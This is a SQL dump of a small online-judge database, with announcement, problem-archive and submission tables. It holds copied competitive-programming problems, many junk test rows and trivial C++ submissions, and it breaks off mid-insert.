-- phpMyAdmin SQL Dump
-- version 5.0.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost
-- Generation Time: Feb 26, 2020 at 08:09 AM
-- Server version: 10.4.11-MariaDB
-- PHP Version: 7.4.2

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `sweoj`
--

-- --------------------------------------------------------

--
-- Table structure for table `announcement`
--

CREATE TABLE `announcement` (
  `id` int(100) DEFAULT NULL,
  `des` longtext DEFAULT NULL,
  `aid` int(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `announcement`
--

INSERT INTO `announcement` (`id`, `des`, `aid`) VALUES
(1, 'fcccccc yfcgv hvhvbhjbjhbh uhhui uhjh huh uuhu huhuh uhuh uh huhuhj uhuhu', 2),
(1, 'hg', 3),
(1, 'hello\r\n', 4),
(1, 'hbkbk', 5),
(9, 'cdsfwes', 24);

-- --------------------------------------------------------

--
-- Table structure for table `archieve`
--

CREATE TABLE `archieve` (
  `id` int(11) NOT NULL,
  `pbname` varchar(100) DEFAULT NULL,
  `pbdes` longtext DEFAULT NULL,
  `pbauthor` varchar(100) DEFAULT NULL,
  `tc` mediumtext DEFAULT NULL,
  `output` longtext DEFAULT NULL,
  `uoutput` longtext DEFAULT NULL,
  `tlimit` double(100,2) DEFAULT 3.00
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `archieve`
--

INSERT INTO `archieve` (`id`, `pbname`, `pbdes`, `pbauthor`, `tc`, `output`, `uoutput`, `tlimit`) VALUES
(1, 'Trick41', '1->1->2->4->8->?\r\n\r\n1->2 2>4 3->6 4->16 5->10 6->?\r\n\r\n\r\noutput example\r\nx\r\ny\r\n\r\nnewline mendatory**\r\nhaah\r\ns\r\n\r\n<b> Input <b> <br>', 'Ranak', 'ab', '16\r\n26\r\n', 'System changes this output because of huge output file', 1.00),
(55, 'Google feeling lucky.', 'Google is one of the most famous Internet search engines which hosts and develops a number of Internetbased<br>\r\nservices and products. On its search engine website, an interesting button â€˜Iâ€™m feeling luckyâ€™\r\nattracts our eyes. This feature could allow the user skip the search result page and goes directly to the\r\nfirst ranked page. Amazing! It saves a lot of time.\r\nThe question is, when one types some keywords and presses â€˜Iâ€™m feeling luckyâ€™ button, which web\r\npage will appear? Google does a lot and comes up with excellent approaches to deal with it. In this\r\nsimplified problem, let us just consider that Google assigns every web page an integer-valued relevance.\r\nThe most related page will be chosen. If there is a tie, all the pages with the highest relevance are\r\npossible to be chosen.\r\nYour task is simple, given 10 web pages and their relevance. Just pick out all the possible candidates\r\nwhich will be served to the user when â€˜Iâ€™m feeling luckyâ€™.\r\nInput\r\nThe input contains multiple test cases. The number of test cases T is in the first line of the input file.\r\nFor each test case, there are 10 lines, describing the web page and the relevance. Each line contains\r\na character string without any blank characters denoting the URL of this web page and an integer\r\nVi denoting the relevance of this web page. The length of the URL is between 1 and 100 inclusively.\r\n(1 â‰¤ Vi â‰¤ 100)\r\nOutput\r\nFor each test case, output several lines which are the URLs of the web pages which are possible to be\r\nchosen. The order of the URLs is the same as the input. Please look at the sample output for further\r\ninformation of output format.\r\n\r\n\r\nSample Input<br><br>\r\n2<br>\r\nwww.youtube.com 1 <br>\r\nwww.google.com 2  <br>\r\nwww.google.com.hk 3 <br>\r\nwww.alibaba.com 10  <br>\r\nwww.taobao.com 5    <br>\r\nwww.bad.com 10      <br>\r\nwww.good.com 7<br>\r\nwww.fudan.edu.cn 8 <br>\r\nwww.university.edu.cn 9 <br>\r\nacm.university.edu.cn 10<br>\r\nwww.youtube.com 1<br>\r\nwww.google.com 2<br>\r\nwww.google.com.hk 3 <br>\r\nwww.alibaba.com 11<br>\r\nwww.taobao.com 5<br>\r\nwww.bad.com 10<br>\r\nwww.good.com 7<br>\r\nwww.fudan.edu.cn 8<br>\r\nacm.university.edu.cn 9 <br>\r\nacm.university.edu.cn 10 <br>\r\n\r\n\r\nSample Output <br>\r\nCase #1:<br>\r\nwww.alibaba.com <br>\r\nwww.bad.com <br>\r\nacm.university.edu.cn <br>\r\nCase #2: <br>\r\nwww.alibaba.com <br>\r\n<h1 style=\"color: red\"> Hello world</h1>', 'uva', '2\r\nwww.youtube.com 1\r\nwww.google.com 2\r\nwww.google.com.hk 3\r\nwww.alibaba.com 10\r\nwww.taobao.com 5\r\nwww.bad.com 10\r\nwww.good.com 7\r\nwww.fudan.edu.cn 8\r\nwww.university.edu.cn 9\r\nacm.university.edu.cn 10\r\nwww.youtube.com 1\r\nwww.google.com 2\r\nwww.google.com.hk 3\r\nwww.alibaba.com 11\r\nwww.taobao.com 5\r\nwww.bad.com 10\r\nwww.good.com 7\r\nwww.fudan.edu.cn 8\r\nacm.university.edu.cn 9\r\nacm.university.edu.cn 10', 'Case #1:\r\nwww.alibaba.com\r\nwww.bad.com\r\nacm.university.edu.cn\r\nCase #2:\r\nwww.alibaba.com\r\n', '', 3.00),
(58, 'IP Checking1', 'An IP address is a 32 bit address formatted in the following way\r\n\r\na.b.c.d\r\n\r\nwhere a, b, c, d are integers each ranging from 0 to 255. Now you are given two IP addresses, first one in decimal form and second one in binary form, your task is to find if they are same or not.\r\n\r\nInput\r\nInput starts with an integer T (â‰¤ 100), denoting the number of test cases.\r\n\r\nEach case starts with two lines. First line contains an IP address in decimal form, and second line contains an IP address in binary form. In binary form, each of the four parts contains 8 digits. Assume that the given addresses are valid.\r\n\r\nOutput\r\nFor each case, print the case number and \"Yes\" if they are same, otherwise print \"No\".\r\n\r\nSample Input\r\n\r\n2\r\n192.168.0.100\r\n11000000.10101000.00000000.11001000\r\n65.254.63.122\r\n01000001.11111110.00111111.01111010\r\n\r\nOutput for Sample Input\r\n\r\nCase 1: No\r\nCase 2: Yes\r\n \r\n\r\nPROBLEM SETTER: JANE ALAM JAN', 'lightoj', '3\r\n80.239.242.53\r\n01010000.11101111.11110010.00110101\r\n118.98.235.40\r\n01000001.11111110.00111111.01111010\r\n141.0.11.253\r\n10001101.00000000.00001011.11111101', 'Case 1: Yes\r\nCase 2: No\r\nCase 3: Yes\r\n', '17wwwwwwwwwwwwwwwwwwwwww', 2.00),
(60, 'Alice And ChessBoard', 'Itâ€™s Sunday afternoon, and Alice is in her room trying to figure out the rules of the game called Chess. She thinks sheâ€™s almost got it, but sheâ€™d like your help.\r\n\r\nAlice has placed a bishop on an empty chessboard. Given the position of the bishop and the positon of another square on the chessboard, Alice would like to know if the bishop can travel to that square in one move or not.\r\n\r\nChess is a game played on an 8*8 rectangular board. The rows of the board are numbered from 1â€¦8 and similarly the columns are numbered from 1â€¦8. (For this problem, you may assume that the rows are numbered from 1 to 8 from top to bottom and the columns are numbered from 1 to 8 from left to right). The bishop occupies a single square on the board (as does every other piece) and it can move any number of squares diagonally, but it cannot travel outside the board. Below is a picture demonstrating the moves of a bishop. The dotted squares are the squares the bishop can travel to in one move.\r\n\r\nlink\r\n\r\nInput\r\n\r\nIn the first line of input, there is a number T (1 â‰¤ T â‰¤ 200) denoting the number of test cases. Each of the next T lines contains the description of the T testcases. Each testcase contains four integers in a single line. The first two integer denotes the row and the column of the position of the bishop respectively and the second two integers denotes the row and the column of the postion of the targeted square respectively. It is guaranteed that the two squares wonâ€™t be the same. And of course, each of these integers will be between 1 and 8.\r\n\r\nOutput\r\n\r\nFor each test case, print â€œYesâ€ (without the quote) in a single line if the bishop can travel to the targeted square in one move. Otherwise print â€œNoâ€ (without the quote) in a single line.\r\n\r\nSample\r\n\r\nInput	\r\n3\r\n5 6 5 1\r\n1 1 2 3\r\n3 4 5 2\r\n\r\nOutput\r\n\r\nNo\r\nNo\r\nYes', 'toph', '3\r\n5 6 5 1\r\n1 1 2 3\r\n3 4 5 2', 'No\r\nNo\r\nYes\r\n', 'aa', 3.00),
(63, 'Greetings', 'After that the code will select a random problem for you from my problems database based on your previously solved problems, your skills and your weaknesses. But while I was coding for implementing this great idea, I found that, all of my problems are scattered in 2 computers. So, I have to merge them before running my code.\r\n\r\nNow you are given the number of problems in each of the computers, you have to find the total number of problems. You can safely assume that no problem is stored in multiple computers. So, all the problems are distinct.\r\n\r\nInput\r\nInput starts with an integer T (â‰¤ 125), denoting the number of test cases.\r\n\r\nEach case starts with a line containing two integers a and b. a denotes the number of problems in the first computer and b denotes the number of problems in the second computer. You can safely assume that a and b will be non-negative and not greater than 10.\r\n\r\nOutput\r\nFor each case, print the case number and the total number of problems. See the samples for exact formatting.\r\n\r\nSample Input\r\n2\r\n1 7\r\n9 8\r\n\r\nOutput for Sample Input\r\n\r\nCase 1: 8\r\nCase 2: 17', 'lightoj', '2\r\n1 7\r\n9 8\r\n', 'Case 1: 8\r\nCase 2: 17\r\n', '', 3.00),
(100, 'YFYFYTFTF', ' GFF GF G ', 'RakibulRanak', 'fcef', 'Durjoy means Foga\r\nFoga doesn\'t mean Durjoy\r\nFoga means Vxd', '', 3.00),
(987, 'hvj', 'bbmvh', 'RakibulRanak', 'hfj', 'nbvb', 'aaa', 3.00),
(5444, 'vewgbt3b3', '3thth', 'RakibulRanak', 'gber', '4g5h3', 'gt4h', 3.00),
(5556, 'bdsvrwbbb', 'evt', 'RakibulRanak', 'vb', 'fvgjv', 'gvcj', 3.00),
(44646, 're3trn3', 'hwttrh', 'RakibulRanak', 'rwbe', '3ttt', 'wt', 3.00),
(55557, 'Vxd Foga', 'Sylhet is a division in Bangladesh mostly famous for tea gardens and other tourist attractions. MoulviBazar is a southeastern district of Sylhet division.\r\nOnce Alex went to Sylhet and met a person from MoulviBazar. When Alex asked him his name,he said it was \"Durjoy\".But one of Durjoy\'s friends said that it should be \"Foga\" and another one mentioned that Foga\'s are vxd\'s,so it should be \"Vxd\" .So,Alex was confused about the name of that MoulviBazar guy.Alex wanted to make himself clear. He was an investigator in his earlier life.As Durjoy and his friends weren\'t helping him in that regard ,Alex went to Moulovibazar to look for \"Foga\" .He was asking people about \"Foga\" and everyone was saying,\"it\'s me.What\'s the matter?\" He found everyone in MoulviBazar saying himself \"Foga\" .Then he smiled and said , \"All of you are vxd\'s. Am I right?? \" Alex found himself in the hospital later.Now he is more confused than ever and wants you to write a program for him to make himself calm.\r\n\r\nInput\r\n\r\n1st line contains an integer t denoting the number of test cases.For each test case there will be 4 lines of input.1st line contains two String N and D denoting the name and district of a person.each of the next 3 lines will contain two strings A,B ( A,B =N/Foga/Vxd )\r\n\r\nOutput\r\n\r\nAlex hopes you know the relation between A and B. For each line of input ,print two lines of output showing the relation between them as follows:\r\n\r\nA means/doesn\'t mean B\r\nB means/doesn\'t mean A\r\n\r\n\r\n\r\nSample Input\r\n2\r\nDurjoy MouloviBazar\r\nDurjoy Foga\r\nFoga Vxd\r\nVxd Durjoy\r\nShifat Barishal\r\nFoga Vxd\r\nShifat Foga\r\nVxd Shifat\r\n\r\nSample Output\r\nDurjoy means Foga\r\nFoga doesn\'t mean Durjoy\r\nFoga means Vxd\r\nVxd doesn\'t mean Foga\r\nVxd doesn\'t mean Durjoy\r\nDurjoy means Vxd\r\nFoga means Vxd\r\nVxd doesn\'t mean Foga\r\nShifat doesn\'t mean Foga\r\nFoga doesn\'t mean Shifat\r\nVxd doesn\'t mean Shifat\r\nShifat doesn\'t mean Vxd', 'RakibulRanak', '2\r\nDurjoy MouloviBazar\r\nDurjoy Foga\r\nFoga Vxd\r\nVxd Durjoy\r\nShifat Barishal\r\nFoga Vxd\r\nShifat Foga\r\nVxd Shifat', 'Durjoy means Foga\r\nFoga doesn\'t mean Durjoy\r\nFoga means Vxd\r\nVxd doesn\'t mean Foga\r\nVxd doesn\'t mean Durjoy\r\nDurjoy means Vxd\r\nFoga means Vxd\r\nVxd doesn\'t mean Foga\r\nShifat doesn\'t mean Foga\r\nFoga doesn\'t mean Shifat\r\nVxd doesn\'t mean Shifat\r\nShifat doesn\'t mean Vxd\r\n', 'Durjoy means Foga\nFoga doesnt mean Durjoy\nFoga means Vxd\nVxd doesnt mean Foga\nVxd doesnt mean Durjoy\nDurjoy means Vxd\nFoga means Vxd\nVxd doesnt mean Foga\nShifat doesnt mean Foga\nFoga doesnt mean Shifat\nVxd doesnt mean Shifat\nShifat doesnt mean Vxd\n', 1.00),
(55558, 'testkori', 'hello Ranaks Brother\r\n\"ranak\" \"\r\n\' \'', 'RakibulRanak', 'qx', 'sqx', '', 1.00),
(55559, 'testkori2', 'hb hj', 'RakibulRanak', 'v jh', 'hh', '', 2.00),
(55560, 'testkori3', 'Ranak\'s bro', 'RakibulRanak', 'v jh', 'hh', '', 2.00),
(55561, '4g3q', 'wqg', 'dvs', 'wfw', 'wef', '', 1.00),
(55562, 'hudai0', 'vjhvj\'jn\'', 'RakibulRanak', 'ss', 'ss', '', 1.00),
(55563, 'bala', 'cShcbs3bjcjSb says \"hi\" nnm', 'RakibulRanak', '2\r\n252', 'efwe', 'efwe', 1.00),
(55568, 'rakib', 'rwgreg', 'rgw', 'rwr', 'cwdc', '', 1.00),
(55573, '3', 's', 'dqef', 'deq', 'rqeg', '', 1.00),
(55574, 'test1', 'output5', 'RakibulRanak', 's', 's', '', 1.00),
(55575, 'Emonbokachoda', '120', 'RakibulRanak', '120', '120\r\n', '', 1.00),
(55576, 'Abal', 'vuda venge debo\r\n\r\n', 'RakibulRanak', '120', 'vuda venge debo\r\n', '', 1.00),
(55577, 'Kheloar', 'Ami mobin ,,,, ami kheli\r\n', 'RakibulRanak', 'Ami mobin ,,,, ami kheli', 'Ami mobin ,,,, ami kheli\r\n', '', 1.00),
(55578, 'Gayok', 'Ami pulock ,,,, ami gai\r\n\r\n', 'RakibulRanak', 'Ami mobin ,,,, ami kheli', 'Ami pulock ,,,, ami gai\r\n', '', 1.00),
(55579, 'CR', 'Ami emon...omanush\r\n\r\n', 'RakibulRanak', 'Ami mobin ,,,, ami kheli', 'Ami emon...omanush\r\n', '', 1.00),
(55580, 'A', 'hbabx', 'RakibulRanak', 's', 'Hello\r\n', 'Hello', 1.00),
(55581, 'ssss', 'a<sup>2</sup>', 'sx', 'ww', 'w\r\n', '', 1.00),
(55582, 'Test html', 'a<sup>2</sup> + b<sup>2</sup> = c<sup>2</sup> <br> log<sub>2</sub>10\r\n<p>ami amar nam</p>\r\n<p>&nbsp;</p>\r\n<p>hudai a<sup>22</sup></p>\r\n<br>', 'RakibulRanak', 'sa', 'sfa', '', 1.00),
(55583, 'Ranak', 'ghjvj', 'RakibulRanak', 'vggn', 'hfyj', '', 1.00),
(55584, 'Ranak', 'ghjvj', 'RakibulRanak', 'vggn', 'hfyj', '', 1.00),
(55585, 'crs', 'gjh', 'RakibulRanak', 'nj', 'jyv', '', 1.00),
(55586, 'xfbdf', 'sgdvfs', 'RakibulRanak', 'vfdbd', 'fsbs', '', 1.00),
(55587, 'Ranakvai', 'cdw', 'RakibulRanak', 'vf', 'vfe', '', 1.00),
(55588, 'A', 'efvfeva\r\n\r\ncan\'t', 'RakibulRanak', 'f3r', '1\r\n', '1\n', 1.00),
(55589, 'e', 'can\'t', 'RakibulRanak', 'h', 'vhv', '', 1.00),
(55590, 'Collecting Coins', 'Polycarp has three sisters: Alice, Barbara, and Cerene. They\'re collecting coins. Currently, Alice has a coins, Barbara has b coins and Cerene has c coins. Recently Polycarp has returned from the trip around the world and brought n coins.\r\n\r\nHe wants to distribute all these n coins between his sisters in such a way that the number of coins Alice has is equal to the number of coins Barbara has and is equal to the number of coins Cerene has. In other words, if Polycarp gives A coins to Alice, B coins to Barbara and C coins to Cerene (A+B+C=n), then a+A=b+B=c+C.\r\n\r\nNote that A, B or C (the number of coins Polycarp gives to Alice, Barbara and Cerene correspondingly) can be 0.\r\n\r\nYour task is to find out if it is possible to distribute all n coins between sisters in a way described above.\r\n\r\nYou have to answer t independent test cases.\r\n\r\nInput\r\nThe first line of the input contains one integer t (1 â‰¤ t â‰¤ 10^4) â€” the number of test cases.\r\n\r\nThe next t lines describe test cases. Each test case is given on a new line and consists of four space-separated integers a,b,c and n (1 â‰¤ a,b,c,n â‰¤ 10^8) â€” the number of coins Alice has, the number of coins Barbara has, the number of coins Cerene has and the number of coins Polycarp has.\r\n\r\nOutput\r\nFor each test case, print \"YES\" if Polycarp can distribute all n coins between his sisters and \"NO\" otherwise.\r\n\r\nExample\r\n\r\ninput\r\n5\r\n5 3 2 8\r\n100 101 102 105\r\n3 2 1 100000000\r\n10 20 15 14\r\n101 101 101 3\r\n\r\noutput\r\nYES\r\nYES\r\nNO\r\nNO\r\nYES\r\n', 'Codeforces', '2\r\n3 798 437 1804\r\n1 1 1 1111', 'YES\r\nNO\r\n', '16\n26\n', 1.00);

-- --------------------------------------------------------

--
-- Table structure for table `code`
--

CREATE TABLE `code` (
  `submit_name` varchar(100) DEFAULT NULL,
  `source_code` longtext DEFAULT NULL,
  `id` int(100) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `code`
--

INSERT INTO `code` (`submit_name`, `source_code`, `id`) VALUES
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2<<endl;\r\n}', 362),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<3l;\r\n}', 363),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2;\r\n}', 364),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2<<endl;\r\n}', 365),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2;\r\n}', 366),
('2', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2<<endl;\r\n}', 367),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<2;\r\n}', 368),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<3l;\r\n}', 369),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 370),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 371),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 372),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 373),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 374),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 375),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 376),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 377),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 378),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 379),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 380),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 381),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 382),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 383),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 384),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 385),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 386),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 387),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 388),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 389),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 390),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 391),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 392),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 393),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 394),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 395),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 396),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 397),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 398),
('Ranak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<3;\r\n}', 399),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 400),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 401),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 402),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 403),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 404),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 405),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 406),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 407),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 408),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 409),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 410),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 411),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{  cout<<\"3\";\r\n}', 412),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<3;\r\n}', 413),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<3;\r\n}', 414),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 415),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 416),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 417),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 418),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 419),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 420),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 421),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 422),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 423),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 424),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 425),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 426),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 427),
('3', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<4;\r\n}', 428),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2\r\n}', 429),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2<<endl\r\n}', 430),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2<<endl;\r\n}', 431),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"120\n\";\r\n}', 432),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << 120 << endl:\r\nreturn 0;\r\n}', 433),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"120\"<<endl;\r\n	return 0;\r\n}', 434),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << 120 << endl;\r\nreturn 0;\r\n}', 435),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Hellow World\n\";\r\n}', 436),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello World\"<<endl;\r\n	return 0;\r\n}', 437),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Hello World\n\";\r\n}', 438),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << Hello World << endl;\r\nreturn 0;\r\n}', 439),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Pagol Hoye Jabo\"<<endl;\r\n	return 0;\r\n}', 440),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << \"Hello World\" << endl;\r\nreturn 0;\r\n}', 441),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << \"Pagol Hoye Jabo\" << endl;\r\nreturn 0;\r\n}', 442),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"120\"<<endl;\r\n	return 0;\r\n}', 443),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Pagol Hoye Jabo\n\";\r\n}', 444),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Hello World\"<<endl;\r\n	return 0;\r\n}', 445),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << \"Mal sob sesh\" << endl;\r\nreturn 0;\r\n}', 446),
('maraz', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"Mal sob sesh\n\";\r\n}', 447),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"Mal sob sesh\"<<endl;\r\n	return 0;\r\n}', 448),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout << \"vuda venge debo\" << endl\r\nreturn 0;\r\n}', 449),
('dipubal', 'asdfghj', 450),
('dipubal', 'asdfghj', 451),
('dipubal', 'asdfghj', 452),
('dipubal', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nint a;\r\ncin>>a;\r\ncout<<a;\r\n}', 453),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 454),
('1', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\n	cout<<\"vuda venge debo\"<<endl;\r\n	return 0;\r\n}', 455),
